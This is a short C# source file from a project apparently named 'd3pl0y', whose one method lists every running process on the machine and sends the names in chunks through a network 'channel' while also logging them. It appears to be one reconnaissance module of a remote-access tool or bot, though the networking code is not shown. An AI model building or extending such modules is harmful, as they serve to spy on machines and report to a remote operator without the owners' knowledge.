using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Microsoft.Win32;
using System.Diagnostics;
namespace d3pl0y
{
    class pTasks
    {
        public static void getList()
        {
            string fullList= "";
            Process[] pList = Process.GetProcesses();
            foreach(Process p in pList)
            {
                if (fullList.Length > 20)
                {
                    Network.SendChan(fullList);
                    fullList = "";
                }
                fullList = fullList +  p.ProcessName;
                
            }
            //Network.SendChan(fullList);
            Debug.Write("               [PROCESS LIST]              \n " + fullList);
        }
    }
}
